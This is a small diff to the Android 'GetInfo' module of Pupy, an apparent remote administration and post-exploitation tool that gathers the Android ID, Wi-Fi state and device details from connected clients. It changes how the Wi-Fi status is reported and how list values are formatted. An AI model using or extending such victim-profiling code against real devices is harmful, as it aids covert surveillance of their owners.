@@ -67,7 +67,7 @@ class GetInfo(PupyModule):
             androidID = self.client.conn.modules["pupydroid.utils"].getAndroidID()
             infos.append(("android_id",androidID))
             wifiEnabled = self.client.conn.modules["pupydroid.utils"].isWiFiEnabled()
-            infos.append(("wifi_enabled",wifiEnabled))
+            infos.append(("wifi_enabled",wifiConnected or wifiEnabled))
             infoBuild = self.client.conn.modules["pupydroid.utils"].getInfoBuild()
             infos.append(("device_name",infoBuild['deviceName']))
             infos.append(("manufacturer",infoBuild['manufacturer']))
@@ -118,6 +118,8 @@ class GetInfo(PupyModule):
         for i, (key, value) in enumerate(infos):
             if value == None or value == "":
                 value = "?"
+            elif type(value) in (list, tuple):
+                value = ' '.join([ unicode(x) for x in value ])
             infoTemp.append((key, value))
         infos = infoTemp
 
